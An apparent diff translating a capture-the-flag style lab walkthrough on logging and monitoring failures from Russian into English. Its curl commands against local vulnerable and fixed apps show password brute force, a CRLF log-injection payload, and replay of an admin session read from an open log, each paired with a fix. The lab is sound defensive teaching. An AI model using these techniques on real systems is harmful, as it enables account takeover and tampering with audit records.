@@ -1,12 +1,12 @@
-🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)
+🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)
 
-# A09 — Разбор решения (спойлеры)
+# A09 — Solution walkthrough (spoilers)
 
-Примеры: `curl` на `http://127.0.0.1:8081` (vulnerable) и `http://127.0.0.1:8082` (fixed). В Windows удобнее Git Bash или WSL (или `curl.exe` в PowerShell).
+Examples: `curl` against `http://127.0.0.1:8081` (vulnerable) and `http://127.0.0.1:8082` (fixed). On Windows, Git Bash or WSL (or `curl.exe` in PowerShell) is more convenient. The texts printed by the application itself are left in Russian, as in the real output; an English gloss is given in parentheses.
 
-## Дефект 1 — неудачные входы и отказы в доступе не логируются
+## Defect 1 — failed logins and access denials are not logged
 
-Переберём пароль `bob` (10 неверных попыток, затем верный), потом зайдём как `alice` и попробуем открыть страницу администратора:
+Let us brute-force `bob`'s password (10 wrong attempts, then the right one), then log in as `alice` and try to open the administrator page:
 
 ```bash
 for p in 123456 password qwerty 111111 abc123 letmein admin 12345678 iloveyou monkey bob123; do
@@ -15,7 +15,7 @@ done
 # 123456:401 password:401 ... monkey:401 bob123:200
 curl -s -c a.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
 curl -s -b a.txt http://127.0.0.1:8081/admin/export
-# {"error": "только для администратора"}   (403)
+# {"error": "только для администратора"} (administrators only)   (403)
 curl -s http://127.0.0.1:8081/logs
 # 2026-10-25T13:49:57 INFO app started
 # 2026-10-25T13:49:57 INFO login ok user=admin password=Adm1n-L0g-Pass! sid=d71a9468ca1abd9e
@@ -23,15 +23,15 @@ curl -s http://127.0.0.1:8081/logs
 # 2026-10-25T13:49:59 INFO login ok user=alice password=alice123 sid=1ca24fb70a9940d0
 ```
 
-Десять неудач и отказ в доступе не оставили в логе ни одной строки. Видна только последняя, успешная попытка.
+Ten failures and an access denial left not a single line in the log. Only the last, successful attempt is visible.
 
-**Правило:** логируем не только успех, но и **неудачи и отказы**: именно по ним видно разведку и перебор.
+**Rule:** we log not only success but also **failures and denials**: they are what reveals reconnaissance and brute force.
 
-**Fix:** каждый неудачный вход и каждый отказ в доступе пишутся в журнал (`# FIX 1`): событие, итог (`failure`), пользователь, IP, время.
+**Fix:** every failed login and every access denial is written to the journal (`# FIX 1`): the event, the outcome (`failure`), the user, the IP, the time.
 
-## Дефект 2 — log injection
+## Defect 2 — log injection
 
-Сообщение из формы обратной связи пишется в лог как есть. Перевод строки в нём создаёт «новую запись», которую никто не писал:
+The message from the feedback form is written to the log as is. A line break in it creates a "new entry" that nobody wrote:
 
 ```bash
 curl -s -X POST http://127.0.0.1:8081/feedback -H 'Content-Type: application/json' \
@@ -43,22 +43,22 @@ curl -s http://127.0.0.1:8081/logs/summary
 # {"flag": "FLAG{a09_log_forged}", "successful_logins": ["admin","bob","alice","mallory"], ...}
 ```
 
-Анализатор разбирает текст построчно и считает, что пользователь `mallory` входил в систему, хотя этого не было.
+The analyzer parses the text line by line and concludes that the user `mallory` logged in, although that never happened.
 
-**Правило:** всё, что пришло от пользователя, перед записью в лог считается недоверенным: убираем управляющие символы (CR/LF), ограничиваем длину и лучше пишем структурно (JSON), а не склеиваем строку.
+**Rule:** everything that came from the user is untrusted before it is written to the log: we remove control characters (CR/LF), limit the length, and it is better to write in a structured way (JSON) than to concatenate a string.
 
-**Fix:** запись в журнал это словарь, а не строка; значения очищаются от управляющих символов и обрезаются (`clean()`, `# FIX 2`). Та же попытка в fixed превращается в одну запись с сообщением `hi 2026-10-25T03:00:00 INFO login ok user=mallory`: подделанной «строки» нет.
+**Fix:** a journal entry is a dictionary, not a string; values are stripped of control characters and truncated (`clean()`, `# FIX 2`). The same attempt in fixed turns into one entry with the message `hi 2026-10-25T03:00:00 INFO login ok user=mallory`: there is no forged "line".
 
-## Дефект 3 — пароли и сессии в логе
+## Defect 3 — passwords and sessions in the log
 
-В строке успешного входа лежат пароль и идентификатор сессии. Достаточно прочитать лог (см. дефект 5):
+The line of a successful login holds the password and the session identifier. It is enough to read the log (see defect 5):
 
 ```bash
 curl -s http://127.0.0.1:8081/logs | grep 'user=admin'
 # 2026-10-25T13:49:57 INFO login ok user=admin password=Adm1n-L0g-Pass! sid=d71a9468ca1abd9e
 ```
 
-Вариант 1 — войти с найденным паролем:
+Option 1 — log in with the password you found:
 
 ```bash
 curl -s -c adm.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"Adm1n-L0g-Pass!"}'
@@ -66,7 +66,7 @@ curl -s -b adm.txt http://127.0.0.1:8081/admin/export
 # {"balances": {...}, "flag": "FLAG{a09_secrets_in_logs}"}
 ```
 
-Вариант 2 — подставить найденную сессию, пароль даже не нужен:
+Option 2 — substitute the session you found, you do not even need the password:
 
 ```bash
 SID=$(curl -s http://127.0.0.1:8081/logs | grep -m1 'user=admin' | sed 's/.*sid=//')
@@ -74,40 +74,41 @@ curl -s -b "a09v_sid=$SID" http://127.0.0.1:8081/admin/export
 # {"balances": {...}, "flag": "FLAG{a09_secrets_in_logs}"}
 ```
 
-**Правило:** в логи не попадают пароли, токены, ключи, номера карт и другие секреты. Логи читают многие: разработчики, поддержка, системы сбора логов.
+**Rule:** passwords, tokens, keys, card numbers and other secrets do not go into logs. Logs are read by many: developers, support, log collection systems.
 
-**Fix:** пароль не логируется совсем, а вместо идентификатора сессии пишется короткий отпечаток (первые 8 символов SHA-256), по которому можно сопоставлять события, но нельзя войти (`# FIX 3`).
+**Fix:** the password is not logged at all, and instead of the session identifier a short fingerprint is written (the first 8 characters of SHA-256), which can be used to correlate events but cannot be used to log in (`# FIX 3`).
 
-## Дефект 4 — нет оповещений
+## Defect 4 — no alerts
 
-После перебора из дефекта 1:
+After the brute force from defect 1:
 
 ```bash
 curl -s http://127.0.0.1:8081/alerts
 # {"alerts": [], "flag": "FLAG{a09_attack_unnoticed}", "note": "за это время было 10 неудачных входов, а оповещений нет — атаку никто не заметил"}
+# (there were 10 failed logins in this time and no alerts — nobody noticed the attack)
 ```
 
-Приложение никак не реагирует на всплеск неудач, список оповещений всегда пуст.
+The application does not react to a burst of failures in any way, the alert list is always empty.
 
-**Правило:** логи сами по себе никого не будят. Нужны правила: сколько событий за какое окно времени считается тревогой, и канал, по которому тревога дойдёт до человека (почта, чат, SIEM).
+**Rule:** logs by themselves wake nobody up. You need rules: how many events in which time window count as an alarm, and a channel through which the alarm reaches a person (email, chat, SIEM).
 
-**Fix:** счётчики с окном 60 секунд и порогами: 5 неудачных входов с одного IP → `BRUTE_FORCE`, 3 отказа в доступе у одного пользователя → `ACCESS_DENIED_BURST` (`# FIX 4`). Сработавшее оповещение само попадает в журнал. В лабе оповещения видны в `GET /alerts`, в реальной системе их отправляют наружу.
+**Fix:** counters with a 60-second window and thresholds: 5 failed logins from one IP → `BRUTE_FORCE`, 3 access denials for one user → `ACCESS_DENIED_BURST` (`# FIX 4`). A triggered alert itself goes into the journal. In the lab the alerts are visible in `GET /alerts`; in a real system they are sent outward.
 
-## Дефект 5 — лог доступен без авторизации
+## Defect 5 — the log is available without authorization
 
 ```bash
 curl -s http://127.0.0.1:8081/logs
 ```
 
-Ни cookie, ни пароля не нужно: любой в сети читает весь лог, а вместе с ним и всё, что попало туда по дефектам 2 и 3.
+No cookie and no password needed: anyone on the network reads the whole log, and with it everything that got there through defects 2 and 3.
 
-**Правило:** лог это чувствительные данные: доступ только у тех, кому он нужен по роли, чтение тоже журналируется.
+**Rule:** a log is sensitive data: access only for those who need it by role, and reading it is logged too.
 
-**Fix:** `GET /logs`, `/logs/summary`, `/logs/verify` и `/alerts` доступны только администратору (`# FIX 5`). Остальным — 401/403, а каждый отказ (403) попадает в журнал и учитывается оповещениями.
+**Fix:** `GET /logs`, `/logs/summary`, `/logs/verify` and `/alerts` are available only to the administrator (`# FIX 5`). Everyone else gets 401/403, and every denial (403) goes into the journal and is counted by the alerts.
 
-## Дефект 6 — нет аудита значимых действий и защиты логов от подмены
+## Defect 6 — no audit of significant actions and no protection of logs from tampering
 
-Сбросим лабу, зайдём как `bob` и переведём деньги:
+Let us reset the lab, log in as `bob` and transfer money:
 
 ```bash
 curl -s -X POST http://127.0.0.1:8081/reset-lab
@@ -115,10 +116,10 @@ curl -s -c b.txt -X POST http://127.0.0.1:8081/login -H 'Content-Type: applicati
 curl -s -b b.txt -X POST http://127.0.0.1:8081/transfer -H 'Content-Type: application/json' -d '{"to":"alice","amount":500}'
 # {"balance": 500, "ok": true}
 curl -s http://127.0.0.1:8081/logs
-# ... login ok user=bob ...   (про перевод нет ни слова)
+# ... login ok user=bob ...   (not a word about the transfer)
 ```
 
-Кто и кому перевёл 500, потом не восстановить. Теперь злоумышленник стирает следы своего входа:
+Who transferred 500 and to whom cannot be reconstructed later. Now the attacker wipes the traces of their login:
 
 ```bash
 curl -s -X POST http://127.0.0.1:8081/_lab/tamper -H 'Content-Type: application/json' -d '{"index":2,"text":null}'
@@ -127,46 +128,47 @@ curl -s http://127.0.0.1:8081/logs
 # 2026-10-25T13:50:35 INFO login ok user=admin password=...
 ```
 
-Строка со входом `bob` исчезла, и в приложении нет ничего, что могло бы это обнаружить.
+The line with `bob`'s login is gone, and there is nothing in the application that could detect it.
 
-**Правило:** значимые действия (деньги, права, экспорт данных, смена настроек) попадают в журнал аудита: кто, что, когда, откуда, итог. Журнал защищён от изменений: append-only хранилище, копия на другой машине, хеш-цепочка или подпись записей.
+**Rule:** significant actions (money, permissions, data export, settings changes) go into an audit journal: who, what, when, from where, the outcome. The journal is protected from changes: append-only storage, a copy on another machine, a hash chain or a signature on the entries.
 
-**Fix:** переводы и экспорт пишутся в журнал (`audit("transfer", ...)`), а каждая запись содержит `prev`, то есть хеш предыдущей записи, и собственный `hash` (`# FIX 6`). `GET /logs/verify` пересчитывает цепочку с начала.
+**Fix:** transfers and exports are written to the journal (`audit("transfer", ...)`), and every entry contains `prev`, the hash of the previous entry, and its own `hash` (`# FIX 6`). `GET /logs/verify` recomputes the chain from the beginning.
 
-## Проверка fixed: вы в роли защитника
+## Checking fixed: you are the defender
 
-Тот же сценарий на `http://127.0.0.1:8082` (пароль админа лежит в `fixed/app.py`):
+The same scenario on `http://127.0.0.1:8082` (the admin password is in `fixed/app.py`):
 
 ```bash
-# перебор + отказ в доступе
+# brute force + access denial
 for p in 123456 password qwerty 111111 abc123 letmein admin 12345678 iloveyou monkey bob123; do
   curl -s -o /dev/null -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d "{\"username\":\"bob\",\"password\":\"$p\"}"
 done
 curl -s -c a.txt -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
 for u in /admin/export /logs /alerts; do curl -s -b a.txt http://127.0.0.1:8082$u; done
 
-# смотрим как админ
+# look as the admin
 curl -s -c adm.txt -X POST http://127.0.0.1:8082/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"Adm1n-L0g-Pass!"}'
 curl -s -b adm.txt http://127.0.0.1:8082/alerts
 # {"alerts": [{"type":"BRUTE_FORCE","count":5,...}, {"type":"ACCESS_DENIED_BURST","key":"alice","count":3,...}]}
 curl -s -b adm.txt http://127.0.0.1:8082/logs/verify
 # {"entries": 18, "ok": true}
 
-# злоумышленник правит журнал
+# the attacker edits the journal
 curl -s -X POST http://127.0.0.1:8082/_lab/tamper -H 'Content-Type: application/json' -d '{"index":3,"text":"success"}'
 curl -s -b adm.txt http://127.0.0.1:8082/logs/verify
 # {"first_bad_seq": 4, "note": "журнал изменён: цепочка хешей нарушена", "ok": false}
+# (the journal was changed: the hash chain is broken)
 ```
 
-Что при этом остаётся за рамками лабы: цепочка хешей ловит правку и удаление «в середине», но не удаление **последних** записей и не пересчёт всей цепочки тем, кто имеет полный доступ к хранилищу. Поэтому в реальных системах последний хеш регулярно отправляют на отдельный сервер или в SIEM. Блокировка перебора (lockout, rate limit) — тема A07, а здесь фиксация и оповещение.
+What remains outside the scope of the lab: the hash chain catches an edit or a deletion "in the middle", but not the deletion of the **last** entries, and not a recomputation of the whole chain by someone with full access to the storage. That is why in real systems the last hash is regularly sent to a separate server or to a SIEM. Blocking brute force (lockout, rate limit) is the topic of A07; here it is recording and alerting.
 
-## Итог
+## Summary
 
-| № | Дефект | Как показан | Что в fixed |
-|---|--------|-------------|-------------|
-| 1 | Неудачи и отказы не логируются | 10 неверных входов и 403 не оставили следов | Каждая неудача и отказ пишутся в журнал |
-| 2 | Log injection | `\n` в `message` создаёт поддельную запись | Структурные записи + очистка управляющих символов |
-| 3 | Секреты в логе | Пароль и `sid` админа прочитаны из лога | Секреты не пишутся, сессия заменена отпечатком |
-| 4 | Нет оповещений | `/alerts` пуст при 10 неудачных входах | Пороги и окно времени, оповещения в журнале |
-| 5 | Лог открыт | `GET /logs` без авторизации | Только администратор, отказы в доступе логируются |
-| 6 | Нет аудита и целостности | Перевод не залогирован, строка удалена незаметно | Аудит значимых действий + хеш-цепочка и `/logs/verify` |
+| № | Defect | How it is shown | What is in fixed |
+|---|--------|-----------------|------------------|
+| 1 | Failures and denials are not logged | 10 wrong logins and a 403 left no traces | Every failure and denial is written to the journal |
+| 2 | Log injection | `\n` in `message` creates a forged entry | Structured entries + stripping of control characters |
+| 3 | Secrets in the log | The admin's password and `sid` read from the log | Secrets are not written, the session is replaced by a fingerprint |
+| 4 | No alerts | `/alerts` is empty after 10 failed logins | Thresholds and a time window, alerts in the journal |
+| 5 | The log is open | `GET /logs` without authorization | Administrator only, access denials are logged |
+| 6 | No audit and no integrity | The transfer is not logged, a line is deleted unnoticed | Audit of significant actions + a hash chain and `/logs/verify` |
